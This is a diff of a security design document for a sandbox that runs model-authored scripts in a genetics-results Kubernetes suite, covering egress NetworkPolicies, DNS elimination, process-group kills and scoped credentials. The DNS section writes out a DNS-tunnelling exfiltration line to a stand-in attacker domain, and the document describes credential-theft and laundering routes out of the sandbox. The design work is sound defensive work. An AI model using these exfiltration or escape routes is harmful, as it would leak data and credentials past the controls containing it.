-  pin nothing at all. What is established is **"still present at TTL/2, absent by TTL +
-  REAPER_POLL_S"**, not "present until the deadline" — the interval between the last probe and
-  the deadline is unmeasured, and it belongs to the reaper. The presence side is also sound
-  only while nothing else is retaining concurrently, which is why the harness refuses to start
-  against a busy sandbox. The **mechanism** is what is verified, at a shortened TTL; the
-  shipped `RETENTION_S` = 300s is read off `sandbox/supervisor.py`, not waited out. (`RETENTION_S`
-  and the unrelated 300s token TTL — section 4 — are numerically equal as of this change; this
-  bullet is about retention only.)
-* **The process-group kill, on the path where the kill actually happens.** The assertion goes
-  on an execution that spawns two grandchildren and then holds the wall clock open until it is
-  killed: the grandchild that stayed **in** the group does not outlive that kill. The
-  normally-completing path is *recorded* rather than asserted **in this harness only**. That
-  used to be because a normal completion signalled nothing at all; since `4h6.66` and `4h6.83`
-  it does, and `scripts/test-supervisor.py`'s `survivors` group asserts both grandchildren are
-  gone, with a negative control that puts them back. What is unverified is that behaviour under
-  *this* harness's runtime, which is why the note here stayed a note.
-
-**Three defects in the local setup were found by trying to run this and are fixed in the same
-change.** Each one made the local run *look* fine while proving less:
-
-1. `scripts/run-sandbox-local.sh` pointed `GENETICS_API_URL` at `host.docker.internal:4000` —
-   the cluster's results-api Service port. Locally `:4000` is **chat-api**, which answers 404
-   on `/api`; results-api is on `:2000`. The SDK was talking to chat-backend.
-2. `scripts/dev-stack.sh` provisioned no `SANDBOX_TOKEN_SIGNING_KEY` and no
-   `INTERNAL_API_SECRET`, so db-api and results-api resolved **no sandbox principal at all**
-   and served the SDK with no per-execution accounting — locally indistinguishable from the bug
-   the tokens exist to fix. It now generates both secrets once into `DEV_STACK_RUN_DIR` (stable
-   across restarts, outside every repo) and exports them unconditionally. It set no
-   `SANDBOX_ENABLED` either, which left results-api's anonymous surface at its wider `@is_public`
-   set, but that is a separate consequence: neither verifier reads that variable, so it was
-   never what emptied the accounting. The script now exports it too, defaulting to `false` as of
-   `genetics-results-suite-4h6.86` — it starts no supervisor, so a `true` default offered
-   `run_analysis` with nothing behind it (see `docs/local-dev-vm.md`).
-3. `SANDBOX_RETENTION_S` had no way through `run-sandbox-local.sh`, so the retention deadline
-   was unobservable in container mode. It is now passed through.
-
-**Two findings on results-api, filed rather than worked around — both FIXED by
-`genetics-results-suite-4h6.65`:**
-
-* Its JSON log formatter carried `sid` and `jti` out of `log_rejection`'s `extra` and **dropped
-  `code`, `limit` and `observed`** — so `Rejection.code`, whose whole purpose is to make a 429
-  actionable in a log, never reached an operator, and the harness read the code off the 429
-  body instead. **Fixed at the mechanism, not at the three names**: `GCPJsonFormatter` no
-  longer consults an `EXTRA_LOG_FIELDS` allow-list (see the allow-list note below), so every
-  `extra=` key reaches `jsonPayload`. `tests/test_log_formatter_extras.py` pins the rejection
-  line's `code`/`limit`/`observed` and the general property.
-* `endpoint_access` recorded `user_email: null` for a sandbox principal even though `sid` and
-  `jti` were stamped, so the authenticated user was not attributable from results-api's log
-  alone. **Where that was actually reachable matters**: with the shipped config
-  (`k8s/deployments/results-api.yaml` sets `REQUIRE_AUTH=true` and
-  `ANONYMOUS_SURFACE_MINIMAL=true`) an auth dependency has already run, `get_verified_user`
-  returned `SandboxPrincipal.identity`, and the middleware's existing
-  `state["authenticated_user"]` fallback had populated the column — so the null appears only
-  where no dependency ran: on an `@is_public` route with the minimal anonymous surface off, or
-  with `REQUIRE_AUTH=false`, which is the local e2e harness this was observed in. **Fixed**:
-  `app/middleware_usage_logging.py` stamps `principal.identity` — `sandbox:<sub>`, the same
-  string the auth path stores, **never the bare address** (see rule 5 below, which the bare
-  address would have falsified in production by making a sandbox row and a human row for the
-  same person identical in the one column the BigQuery sink admits). db-api's record and the
-  audit stream carry `sub` as before; the join no longer *needs* a second source.
-
-**Deliberately measured rather than asserted: `4h6.55`'s `setsid()` finding REPRODUCED here,
-and the measurement below PREDATES the subreaper sweep.** In this configuration — plain Docker,
-`runc`, `--pids-limit 1024` — a grandchild that `setsid()`s away from the execution's process
-group was **still resident after the execution had been killed by its wall clock**, while its
-sibling that stayed in the group was gone. Measured 2026-08-17, and kept as the record of the
-defect rather than as current behaviour: `4h6.83` now kills such a process at the END of the
-execution by parentage, and `4h6.66` kills the group on the completing path, both asserted in
-`scripts/test-supervisor.py`. Neither has been re-measured under **this** harness.
-
-```
-process group: a grandchild IN the group does not outlive a limit kill        ok
-note  after the LIMIT kill the setsid() grandchild is RESIDENT: alive=['D'] zombie=['G']
-note  the NORMALLY-COMPLETING execution's group is never signalled, and both of its
-      grandchildren are alive=['D', 'G']
-```
-
-Neither note is a pass/fail. When they were written, asserting the escapee was gone would have
-asserted the comfortable answer; the property now exists and is asserted in
-`scripts/test-supervisor.py` instead, where the negative control can be run. **A green run of
-this file has never been evidence about that property either way** — it asserts only the limit
-path's in-group kill.
-
-An earlier draft of this section claimed the opposite, and the mechanism by which it did is
-worth keeping written down. The probe `exec`'d `/bin/sleep`; the image is
-`gcr.io/distroless/python3-debian12:nonroot` and **has no `/bin/sleep`** — no coreutils and no
-shell at all — so both forks died in `execv` with `ENOENT` and lingered only as unreaped
-zombies carrying no marker. The scan then found nothing, and "nothing found" read as "nothing
-survived". The guard written specifically to stop that — *the grandchildren really were
-spawned* — counted the parent's `SPAWNED` lines, which the parent prints on the `pid != 0`
-branch the moment `fork()` returns, **before and regardless of** whether the child's `exec`
-succeeded. A guard on a syscall's return value is not a guard on the object's existence. The
-probe now forks without `exec`ing (the shape `scripts/test-supervisor.py` already uses), names
-each grandchild through `/proc/self/comm` (`prctl(PR_SET_NAME)` — a fork without `exec`
-inherits the parent's `argv`, so the name is the only marker available), and the parent **reads
-that name back out of `/proc/<pid>/comm`** before it goes on. The scan looks for it in
-`/proc/<pid>/stat`, and treats an unreaped zombie as *not* a survivor: the supervisor is pid 1
-and never waits on orphans, so a grandchild it killed stays visible with its name intact and
-state `Z`.
-
-**Nothing here establishes any cross-user isolation property**, and the harness says so: `4h6.55`
-has measured a child reading other executions' tokens out of inherited memory and reading and
-overwriting other executions' artifacts. `4h6.55` states the local single-developer path is not
-blocked by that; it does not become untrue because this run passed.
-
-**Not claimed, and not claimable here:** gVisor syscall behaviour, the NetworkPolicy egress
-allow-list, the kubelet's `pod_pids_limit`, RuntimeDefault seccomp, and whether `oom_score_adj`
-and `/proc` process-group inspection behave under `runsc`. Those are `4h6.51`'s.
+| `output` | string, always present | stdout and stderr interleaved, one window, lossily decoded |
+| `output_bytes` | integer | total read from the pipe before capping |
+| `output_truncated` | boolean | true iff `output` was elided **or** the pipe cap fired |
+| `error` | object or `null` | present iff `status != "ok"`: `type`, `message`, `traceback`, `limit` |
+| `artifacts` | array, always present | the manifest: `name`, `size`, `content_type`, nothing else |
+| `artifacts_omitted` | integer ≥ 0 | present in the directory, not listed retrievably |
+| `artifacts_retained_in_clear` | boolean | the seal pass could **neither encrypt nor delete** what the script wrote |
+
+The response carries no token, no filesystem path, no environment and no host name.
+
+`output` is one field rather than two because the budget is one window and the traceback the
+model needs is at the tail; splitting it either halves the window or doubles the budget. It is
+decoded with `errors="replace"` and there is **no base64 and no `encoding` field** — a client
+that has to branch on encoding will eventually get the branch wrong, and a script with binary
+to return writes an artifact. The elision marker is fixed text so truncation is recognisable
+without heuristics, and it is *additional* to the byte budget.
+
+`artifacts_retained_in_clear` is deliberately **not** folded into `artifacts_omitted`. That
+count means "produced, present, not listed" and cannot distinguish "destroyed everything" from
+"destroyed nothing"; this says the bytes are still readable at the shared uid.
+
+<!-- BEGIN GENERATED: error-types -->
+
+Reserved `error.type` names — the supervisor emits no others for these conditions and a client may branch on them: `ArtifactQuota`, `Killed`, `MemoryLimit`, `NonZeroExit`, `OutputLimit`, `PidLimit`, `ScratchQuota`, `StartupFailure`, `Timeout`.
+
+The other half of `error.type`'s range is the child's own exception class name, which is why the field is an open string. `_sanitise_error_type` refuses a child-supplied value over 64 bytes, one that is not a dotted identifier, and any reserved name — so a script cannot forge one.
+
+Reserved but never emitted: `Killed`, `MemoryLimit`, `NonZeroExit`, `StartupFailure`. The memory ceiling is `RLIMIT_AS`, applied by the child to itself, so what comes back is the child's own `MemoryError` on the open half of the range. The name stays reserved only so a script cannot forge it.
+
+<!-- END GENERATED: error-types -->
+
+**The artifact manifest** carries one entry per retrievable file and its shape is dictated by
+what `read_artifact` can consume: a **bare name**, never a path, never an execution id, never a
+URL. An entry carrying any of those would name something the read refuses by construction, and
+an execution id in the manifest would invite a model-supplied one back in. The supervisor lists
+a file only if it would survive that read — a regular file directly in the artifacts directory,
+`st_nlink == 1`, no symlinks, FIFOs, sockets or devices, no recursion, and a name that is valid
+UTF-8 with no control characters and no leading or trailing whitespace. The whitespace rule is
+not cosmetic: the executor strips the name *before* validating, so `"plot.png "` would pass
+every other rule, get listed, and then be unretrievable behind the same indistinguishable
+"Artifact not found" a name that never existed gets. `content_type` is derived from the name
+and must not be sniffed from content, because the read recomputes it the same way.
+
+**`GET /artifact?execution_id=…&name=…`** returns one file base64 in the same JSON envelope, so
+this route answers in the same shape as every other and the outgoing cap stays a single choke
+point. See section 6 for who may read what.
 
 ---
 
 ## 3. Egress policy
 
-Today `k8s/network-policies/policies.yaml` contains **ingress rules only** — there is no
-egress policy anywhere in the namespace. The sandbox introduces the first one, and it is
-default-deny.
+Default-deny, both directions. The sandbox is a leaf: it is called, it does not call back.
 
-### Decisions
+<!-- BEGIN GENERATED: network -->
 
-`k8s/network-policies/sandbox-policy.yaml`, selector `app: sandbox`.
+**`allow-ingress-sandbox`** — selects `app: sandbox`, policyTypes Ingress
 
-**As built (`4h6.8`).** Two objects rather than one, following the namespace's
-`allow-ingress-<target>` naming: `allow-ingress-sandbox` (`policyTypes: ["Ingress"]`) and
-`sandbox-egress` (`policyTypes: ["Egress"]`). They union to the single
-`["Ingress", "Egress"]` object specified above; splitting them keeps the file's names
-consistent with the eight existing ingress policies. The file is applied by
-`deploy.sh`'s existing `kubectl apply -f network-policies/`, which takes the whole
-directory — no `deploy.sh` change was needed.
+- ingress: `app: chat-backend` on 8080/TCP
 
-**Label contract, declared here and repeated at the top of the policy file and in the
-`4h6.7` bead notes:** pod label `app: sandbox` on the Deployment's
-`.spec.template.metadata.labels`, container port **8080/TCP**, Service named `sandbox`
-(ClusterIP 8080 → targetPort 8080). NetworkPolicy `ports` are **pod** ports, not Service
-ports. A podSelector that matches no pod is not an error — it is silent no-coverage, and
-since this is the only egress policy in the namespace, a label mismatch in `4h6.7` yields a
-sandbox with *unrestricted* egress and no signal anywhere.
+**`sandbox-egress`** — selects `app: sandbox`, policyTypes Egress
 
-**Egress — allow exactly two, deny everything else:**
+- egress: `app: db-api` on 8080/TCP
+- egress: `app: results-api` on 4000/TCP
 
-| Destination | Port | Why |
-|---|---|---|
-| `podSelector: app: db-api` | 8080/TCP | The primary data path. |
-| `podSelector: app: results-api` | 4000/TCP | Summary statistics, LD, fuzzy search — the things BigQuery cannot serve. |
+The receiving end has to admit it too — a sandbox egress allow is necessary and not sufficient against the namespace's `default-deny-ingress`:
 
-Read that table as a statement about *data*, not about endpoints: a third-party annotation
-source is unreachable by construction because no rule can match it, whereas **anything
-results-api serves is reachable** — including artefacts it merely relays from GCS, such as the
-phenotype-report markdown — since the sandbox's token is not scoped per route (see "Require the
-*sandbox* token on all routes", rejected below), so a script can reach any of it by hand-rolled
-HTTP whether or not a wrapper exists for it.
+- `allow-ingress-db-api` admits `app: sandbox` on 8080/TCP
+- `allow-ingress-results-api` admits `app: sandbox` on 4000/TCP
 
-**No kube-dns rule.** Name resolution is done with `hostAliases` instead — see "On DNS"
-below. This is a change from an earlier draft, which allowed 53/UDP+TCP to
-`kube-system`/`k8s-app: kube-dns` and booked DNS tunnelling as an accepted residual.
+<!-- END GENERATED: network -->
 
-**Denied by omission, and each is load-bearing:**
+**Label contract.** A `podSelector` that matches no pod is not an error — it is silent
+no-coverage, and since this is the only egress policy in the namespace a label mismatch yields
+a sandbox with *unrestricted* egress and no signal anywhere. `scripts/test-network-policies.py`
+is the offline guard: it parses every file in `k8s/network-policies/` at once, because
+NetworkPolicies are additive and "mcp-server cannot reach the sandbox" is a property of all of
+them together, and it fails on any rule that selects the sandbox and admits mcp-server —
+including a from-less rule, which admits everything.
 
-- **The internet.** No `ipBlock` rule of any kind. A script cannot `pip install`, cannot
-  fetch a mining payload, and cannot `POST` query results anywhere.
-- **`chat-data`.** Not a network control — the PVC is simply not mounted (section 2). Named
-  here because it is the asset the egress policy exists to protect.
-- **keycloak and keycloak-postgres.** The identity broker and its database.
-- **rag-service** and **chat-backend**. The sandbox is a leaf: it is called, it does not
-  call back. Denying egress to chat-backend also means a script cannot re-enter the chat
-  API with the caller's session.
-- **mcp-server.** Denying this closes the obvious laundering route — a script that could
-  reach mcp-server would inherit mcp-server's own permission through the
-  `allow-ingress-db-api` policy and its whole registered tool surface (deliberately not
-  counted here — re-derive from `TOOL_DEFINITIONS` + `BIGQUERY_TOOL_DEFINITIONS` +
-  `SUBAGENT_TOOL_DEFINITIONS` minus `mcp_server.py`'s `_mcp_disabled`; a number written down
-  here rots silently).
-- **`169.254.169.254`** (the GCE/GKE metadata server). **Amended by `4h6.8` — the original
-  "covered by default-deny" is an over-claim and the policy must not be relied on here.**
-  No rule permits it, so under standard NetworkPolicy semantics it is denied; but
-  link-local / node-local traffic is exactly the class already proven **exempt** from
-  NetworkPolicy on this dataplane in the ingress direction (kubelet probes from
-  `169.254.4.6` reach pods whose policies list only podSelectors — this is the same
-  observation that lets every other rule in the namespace skip a probe ipBlock). Whether
-  Dataplane V2 enforces *egress* to a link-local address has not been tested on this
-  cluster. Assume no coverage from the policy until it is; `genetics-results-suite-4h6.26`
-  carries the test. What is actually load-bearing: the node pool runs in
-  `GKE_METADATA` mode and the sandbox KSA has no
-  Workload Identity binding, so even a policy-engine gap yields no usable GCP credential.
-  Note precisely what does *not* help here — `automountServiceAccountToken: false` is a
-  Kubernetes-API control and has no bearing on the metadata server, and Workload Identity
-  bindings are irrelevant if the pool were ever created in `GCE_METADATA` mode. The
-  metadata defence lives in the node pool spec (section 2), not in this policy.
+Read the egress table as a statement about **data**, not endpoints: a third-party annotation
+source is unreachable because no rule can match it, whereas **anything results-api serves is
+reachable**, including artefacts it merely relays from GCS, since the sandbox's token is not
+scoped per route and a script can hand-roll HTTP whether or not a wrapper exists.
 
-**Ingress — allow exactly one:**
+**Denied by omission, each load-bearing:** the internet (no `ipBlock` rule of any kind — no
+`pip install`, no mining payload, nowhere to POST results); keycloak and its database;
+rag-service and chat-backend (denying chat-backend also means a script cannot re-enter the chat
+API with the caller's session); and **mcp-server**, which closes the obvious laundering route —
+a script that could reach mcp-server would inherit its permission through
+`allow-ingress-db-api` and its whole registered tool surface.
 
-| Source | Port |
-|---|---|
-| `podSelector: app: chat-backend` | 8080/TCP |
+**169.254.169.254 is not covered by this policy and must not be assumed to be.** Link-local
+traffic is exactly the class already proven exempt from NetworkPolicy on this dataplane in the
+ingress direction, and whether Dataplane V2 enforces *egress* to a link-local address has not
+been tested here. What is load-bearing is the node pool: `GKE_METADATA` mode plus no Workload
+Identity binding for the KSA, so even a policy-engine gap yields no usable GCP credential.
 
-Not the load balancer, not mcp-server, not the monitor. `k8s/network-policies/monitor-policy.yaml`
-must **not** be extended to include the sandbox; liveness is the kubelet's job and kubelet
-probes are not subject to NetworkPolicy.
+### On DNS: none, and `hostAliases` instead
 
-### The other half of the egress path: db-api's ingress policy must be amended
+An earlier draft allowed kube-dns and booked DNS tunnelling as a low-bandwidth residual "at a
+few hundred bytes per query". That was wrong by three orders of magnitude. A pod with egress to
+CoreDNS sustains on the order of 10³ queries/second at ~200 usable base32 bytes per query name
+— **~200 KB/s, tens of megabytes inside the wall clock**. It needs no POST and no response:
+`socket.getaddrinfo(b32(chunk) + ".exfil.attacker.example")` is the whole payload, and the
+resolver walks it upstream to the attacker's authoritative server for free. A GCP access token
+is about 1 KB, so five queries.
 
-**Without this edit the primary data path does not work at all.** A NetworkPolicy egress
-allow on the sandbox side is necessary but not sufficient:
-`k8s/network-policies/policies.yaml` declares a namespace-wide `default-deny-ingress`, and
-`allow-ingress-db-api` currently admits only `app: chat-backend` and `app: mcp-server` on
-8080. Every sandbox → db-api connection is therefore dropped at the *receiving* end no
-matter what the sandbox's own policy says.
+So: no kube-dns rule, and `hostAliases` pinning db-api and results-api to their ClusterIPs,
+substituted by `deploy.sh` at deploy time. **All four name forms per IP** (bare, `.genetics`,
+`.genetics.svc`, `.genetics.svc.cluster.local`), because the `files` NSS module does no
+search-domain expansion. `/etc/nsswitch.conf` must list `files` before `dns` — absent the file,
+glibc defaults to `dns [!UNAVAIL=return] files` and every lookup stalls the full resolver
+timeout before it reaches `hostAliases`, which `readOnlyRootFilesystem` makes unfixable at
+runtime. That is asserted twice, at build time and at supervisor startup.
 
-`4h6.8` adds
-
-```yaml
-- podSelector:
-    matchLabels:
-      app: sandbox
-```
-
-to the existing `from:` list of `allow-ingress-db-api`.
-
-**Amended by `4h6.8`: the same edit is required on `allow-ingress-results-api`, and this
-paragraph used to say the opposite.** The original text said "nothing else in that file
-changes" and warned against copying `allow-ingress-results-api`, because at the time that
-policy carried a rule with `- ports:` and **no `from:`** — which admits *all* sources, so
-the sandbox would have reached results-api on 4000 without an explicit entry. That hole
-was one half of `genetics-results-suite-fad` and it is now **closed**: `fad` and
-`genetics-results-suite-k4t` between them scoped every from-less rule in the namespace, so
-`allow-ingress-results-api` is now an explicit podSelector list (auth-gateway, bff,
-chat-backend, mcp-server). The sandbox must therefore be added to it **explicitly**, or the
-results-api half of the data path is dropped at the receiving end exactly like db-api's.
-The original warning still stands in its general form: every rule added for the sandbox
-carries an explicit `from:`, and `scripts/test-network-policies.py` asserts that none of
-them is from-less.
-
-**Both reverse-direction entries are reachability only; neither path returns data today.**
-db-api 401s any request without `Authorization: Bearer $INTERNAL_API_SECRET`, and since
-`fad` results-api returns 401 for a request carrying neither the trusted-proxy marker nor
-a valid bearer (`REQUIRE_AUTH=true` in production; `get_verified_user` → `None` →
-`auth_required` raises 401). The sandbox holds neither secret **by design**. So after
-`4h6.8` the sandbox can open a TCP connection to both services and every request comes back
-401 until `4h6.9` lands the scoped short-lived credential. That is the expected
-intermediate state, not a regression — and the fix is `4h6.9`, never handing the sandbox
-`INTERNAL_API_SECRET`.
-
-### On DNS
-
-**Decision: no DNS egress in v1. The sandbox resolves names from `hostAliases`.**
-
-An earlier draft allowed kube-dns and booked DNS tunnelling as a low-bandwidth accepted
-residual — "a few hundred bytes per query". That framing is wrong by three orders of
-magnitude and it falsifies two claims this document makes elsewhere. A pod with egress to
-CoreDNS can sustain on the order of 10³ queries/second; at roughly 200 usable base32 bytes
-per query name that is **~200 KB/s, i.e. tens of megabytes inside the 120-second wall
-clock**. That is not a side channel, it is a working egress pipe. It needs no POST and no
-response — `socket.getaddrinfo(b32(chunk) + '.exfil.attacker.example')` is the whole
-payload, and the resolver walks it upstream to the attacker's authoritative server for
-free. It is also exactly how a stolen credential leaves the cluster: a GCP access token is
-about 1 KB, five queries.
-
-So the elimination becomes the default:
-
-- No kube-dns rule in the sandbox egress policy.
-- `hostAliases` on the sandbox pod pinning `db-api` and `results-api` to their ClusterIPs,
-  which `deploy.sh` resolves and substitutes at deploy time. The sandbox resolves **exactly
-  two names** — this is the whole reason the trade is cheap here and would not be cheap for
-  any other pod in the namespace.
-- ClusterIPs are stable for a Service's lifetime, so the pinning holds. The cost is a
-  deploy-time coupling between the manifest and live cluster state: if a Service is deleted
-  and recreated, the sandbox must be re-rendered and rolled. `deploy.sh` already generates
-  manifests, so this is a known shape rather than a new one, and the failure mode is a
-  connection error the model sees, not a silent wrong answer.
-
-Eliminating DNS moves name resolution from a network service into libc configuration, and
-libc configuration has four sharp edges. Each is a hard requirement on `4h6.7` and
-`4h6.8`, not advice.
-
-**(a) Pin all four name forms, and fix the URL form the SDK is given.** `hostAliases`
-writes literal strings into `/etc/hosts`, and the glibc `files` NSS module does **no
-search-domain expansion** — `db-api` in `/etc/hosts` does not answer a lookup for
-`db-api.genetics.svc.cluster.local`. Every service URL in this suite is an FQDN:
-`k8s/deployments/chat-backend.yaml` and `k8s/deployments/mcp-server.yaml` both use
-`http://db-api.genetics.svc.cluster.local:8080`. So pinning the bare name alone breaks the
-moment the sandbox is configured like every other service in the namespace. Each of the two
-IPs gets **all four forms** as multiple `hostnames` under one entry:
-
-```yaml
-hostAliases:
-  - ip: "${DB_API_CLUSTER_IP}"
-    hostnames: ["db-api", "db-api.genetics", "db-api.genetics.svc", "db-api.genetics.svc.cluster.local"]
-  - ip: "${RESULTS_API_CLUSTER_IP}"
-    hostnames: ["results-api", "results-api.genetics", "results-api.genetics.svc", "results-api.genetics.svc.cluster.local"]
-```
-
-and the SDK is configured with the **FQDN** form —
-`http://db-api.genetics.svc.cluster.local:8080` and
-`http://results-api.genetics.svc.cluster.local:4000` — matching the rest of the suite. The
-other three forms are pinned so that a URL copied from anywhere else still resolves rather
-than falling through to a DNS lookup that cannot happen.
-
-**(b) `/etc/nsswitch.conf` must be asserted at image build time. The whole decision rests
-on it.** `hostAliases` only helps if glibc consults `files` before `dns`. When
-`/etc/nsswitch.conf` is **absent**, glibc's compiled-in default for the hosts database is
-`dns [!UNAVAIL=return] files` — **DNS first**. Combined with an egress policy that
-**drops** 53/UDP rather than rejecting it, every lookup then stalls through the full
-resolver timeout budget (roughly 5s × 2 attempts × 2 nameservers) before falling back to
-`/etc/hosts`. Inside a 60-second wall clock that is crippling, and it is a **hang, not an
-error** — precisely the failure shape this decision claims to have eliminated. It cannot be
-repaired at runtime either: `readOnlyRootFilesystem: true`. Distroless images do ship an
-`/etc/nsswitch.conf` containing `hosts: files dns`, but "do" is not a guarantee across base
-image revisions. **`4h6.6` must assert at build time** that `/etc/nsswitch.conf` exists in
-the final image and that its `hosts:` line lists `files` before `dns` — a build-stage check
-that fails the build, plus a startup assertion in the supervisor as a cheap backstop.
-
-**(c) Implicit resolutions must be eliminated, not merely denied.** Anything that reaches
-`google.auth.default()` probes `metadata.google.internal` **by name**. With no DNS that is
-the same multi-second stall as (b), not the fast failure the design assumes. `4h6.6`
-therefore requires **either** that the sandbox image contains no `google-auth`-based client
-at all (preferred — the SDK talks to db-api and results-api over plain HTTP and needs no
-GCP client), **or**, if one is unavoidable as a transitive dependency, that
-`GCE_METADATA_HOST` is set to a literal IP so the probe fails immediately against the
-NetworkPolicy instead of stalling in the resolver. Two things this does *not* affect: TLS
-(both destinations are plain HTTP, so there is no certificate hostname to reconcile with an
-IP), and IPv6 (`/etc/hosts` entries yield A records only, and neither Service is
-dual-stack).
-
-**(d) `deploy.sh` must resolve the ClusterIPs after the Services exist, and validate the
-result.** Three specific traps, all silent:
-
-- **Bootstrap deadlock.** `deploy.sh` is `set -euo pipefail`. The natural place to put the
-  `kubectl get svc` lookups is the "derive variables" block near the top — and there they
-  abort the **first deploy to a fresh cluster**, before any manifest is applied, because the
-  Services do not exist yet. The lookups must run **after** the Services are applied. The
-  apply loop iterates `deployments/*.yaml` alphabetically with each Service defined inside
-  its own deployment file, so resolving per-file inside that loop works: by the time
-  `sandbox.yaml` is reached, `db-api.yaml` and `results-api.yaml` have been applied.
-- **Silent literal passthrough.** The existing `envsubst` calls pass **explicit variable
-  allow-lists**. A name omitted from that list is not substituted and not an error — the
-  manifest ships with the literal string `${DB_API_CLUSTER_IP}` in the `ip:` field.
-  `DB_API_CLUSTER_IP` and `RESULTS_API_CLUSTER_IP` must be added to the deployments
-  `envsubst` allow-list.
-- **Headless `None`.** `kubectl get svc ... -o jsonpath='{.spec.clusterIP}'` returns the
-  literal string `None` for a headless Service, and `None` substitutes into the manifest
-  perfectly cleanly. The resolved value must be **validated as a dotted quad** and the
-  deploy aborted otherwise — not defaulted, not warned about.
-
-**If this is ever reverted** — for instance because an SDK dependency turns out to need a
-third name — the residual must be restated honestly at ~200 KB/s rather than "a few hundred
-bytes", and section 6.2 control #1 and section 6.4 control #2 must both be rewritten,
-because with DNS allowed there *is* a sink and the classic payload *does* have somewhere to
-go. Reverting is a decision about accepting bulk exfiltration, not a convenience tweak.
-
-### Egress that does not originate in the pod: BigQuery remote functions (`4h6.35`)
-
-Everything above reasons about traffic leaving the sandbox pod, and so does the
-NetworkPolicy. A **BigQuery remote function** is neither. It is a UDF backed by a Cloud
-Run or Cloud Functions endpoint: BigQuery itself calls that endpoint with the row values
-while executing the query, from Google's infrastructure, on a connection the sandbox never
-opens. Invoked inside an otherwise-legitimate `SELECT` it passes **both** gates db-api
-applies — the statement really is a `SELECT`, and **routines do not appear in
-`referencedTables`**, which is the only thing the allow-list is compared against. Creating
-one is DDL and is therefore blocked by the same `statement_type` gate, so this only ever
-mattered if a remote function *already existed* in the project.
-
-**Closed by observation for `phewas-development`, and for that project only.** Measured
-2026-08-26 with an owner-level human account: the project has four datasets
-(`genetics_api_logs`, `genetics_chat_logs`, `genetics_dev`, `genetics_results`, all
-`europe-west1`), and `bq ls --routines` returns an empty list for every one of them. The
-stronger half of the result is the connection: `bq ls --connection` fails with *"BigQuery
-Connection API has not been used in project phewas-development before or it is disabled"*,
-and `gcloud services list --enabled` shows only `bigquery.googleapis.com` and
-`bigquerystorage.googleapis.com` — `bigqueryconnection.googleapis.com` is absent. A remote
-function requires a connection and a connection cannot be created while that API is
-disabled, so this is not "none exist today" but **none can exist** until someone enables an
-API, which is an auditable act.
-
-**Why the empty result is evidence and not merely an absence of it.** `bq ls` **at project
-scope** fails *silently* — empty output, exit 0 — when the caller cannot see the project,
-which is byte-identical to a genuinely empty list; a bare empty project-scope listing must
-never be written down as a finding. A **dataset-scoped** `bq ls --routines` does not behave
-that way: where it is not permitted it denies loudly with exit 1 and
-`bigquery.routines.list denied`. Because the denial mode is distinguishable from the empty
-mode, the four exit-0 empties above are real empty sets. Anyone re-checking this should use
-the dataset-scoped form for the same reason.
-
-**Not established for `daly-finngenie`, and the terraform argument does not close the gap.**
-Every probe against that project from this machine was an IAM denial — `projects describe`,
-`bq ls --routines`, `bq ls --connection`, `services list` — so whether its Connection API is
-enabled is simply unknown; note the connection probe there denied on IAM rather than
-returning the "API not enabled" message, so the two projects' results are not comparable.
-It is tempting to argue from `terraform/`: no `.tf` file mentions a connection or a routine,
-and the suite workload GSA holds only `bigquery.dataViewer` + `bigquery.jobUser` (plus
-`artifactregistry.reader`, storage and logging), neither of which can create a routine or
-use a connection. That argument is sound but answers a different question — it shows the
-**suite's own service account** cannot create one, not that no other principal in that
-project has. This repo's own terraform holds a concrete instance of exactly that gap:
-`terraform/logging.tf` grants `roles/bigquery.dataEditor` to each log sink's
-`writer_identity` (the `endpoint_access` and `chat_backend` sinks), and `dataEditor`
-carries `bigquery.routines.create`. Those grants are dataset-scoped to the two log datasets
-rather than to `genetics_results`, so they do not reach the data the sandbox reads — but
-they are non-suite principals that hold routine-create in the project, which is the whole
-point: the terraform argument bounds one service account, not the project. Do not promote
-it into a suite-wide claim. A suite-wide claim requires someone
-with `daly-finngenie` access to run the same four commands there. The `daly-staging` profile
-names no project id in this repo at all (tfvars are gitignored by design), so there is
-nothing to check here for it.
-
-**If a routine ever does exist**, the follow-on question is whether the dry run even exposes
-referenced routines in its metadata — check that it is detectable before designing an
-allow-list around it.
+The operational cost is the residual: a Service deleted and recreated out of band leaves the
+sandbox pointing at a dead IP until it is re-rendered and rolled. **A stale IP cannot become a
+wrong destination** — the policy selects pods, not IP blocks, and Dataplane V2 evaluates egress
+post-DNAT, against the identity of the pod the connection actually lands on. Traffic to a
+reused ClusterIP resolves to a workload the policy does not permit and is dropped. The
+stale-IP failure mode is a connection error in every case, never a silent misdelivery.
 
 ---
 
 ## 4. Credentials
 
-### The rule
+**The sandbox never holds `INTERNAL_API_SECRET`.** That secret authenticates the *service*, not
+the *request*; it does not expire; and a script that reads it can reach db-api and results-api
+directly and forever, from anywhere those services are reachable. It already leaked into
+model-authored scripts once — that is what `_ALLOWED_ENV_KEYS` is scar tissue from.
 
-**The sandbox never holds `INTERNAL_API_SECRET`.** That secret authenticates the *service*,
-not the *request*; it does not expire; and a script that reads it can reach db-api and
-results-api directly and forever, from anywhere those services are reachable. The
-`_ALLOWED_ENV_KEYS` comment records that this exact secret already leaked into
-model-authored scripts once.
+A network policy is not a sufficient substitute either. mcp-server is permitted through
+`allow-ingress-db-api` and is itself reachable from outside, so anything that could drive
+mcp-server could reach BigQuery behind it. The sandbox must not become a second instance of
+that shape: its network position and its credential must *both* be narrow.
 
-Note also *why a network policy is not a sufficient substitute*. `docs/project-spec.md`
-records:
+**The credential.** chat-backend mints, per execution, **two** HS256 JWTs — one per audience,
+so a token captured from a results-api request cannot be replayed at db-api — signed with a
+dedicated `SANDBOX_TOKEN_SIGNING_KEY`, deliberately not `INTERNAL_API_SECRET`: separate key,
+separate blast radius, independent rotation. Chosen over an opaque token plus introspection
+because db-api is stateless and has no store, and introspection would require it to call
+chat-backend, inverting the dependency direction.
 
-> The NetworkPolicy is not a boundary on its own: mcp-server is permitted through it and is
-> itself reachable from outside, so anything that could drive mcp-server could reach
-> BigQuery behind it.
-
-`genetics-results-db/api/main.py`'s `require_auth` docstring makes the same point in its own
-words — that before the shared secret the sole control was the cluster NetworkPolicy, and
-mcp-server sits on *both sides* of that boundary. Same reasoning, different wording; the
-quote above is project-spec's.
-
-The sandbox must not become a second instance of that shape. Its network position and its
-credential must *both* be narrow.
-
-### Decisions
-
-**Minter:** chat-backend. It is the only caller of the sandbox, it already holds
-`INTERNAL_API_SECRET`, and it is the only component that knows the authenticated end user
-and the chat session.
-
-**Form:** HS256 JWT, signed with a **new, dedicated** secret `SANDBOX_TOKEN_SIGNING_KEY`
-(32 random bytes, `create-secrets.sh`), shared between chat-backend (mint) and
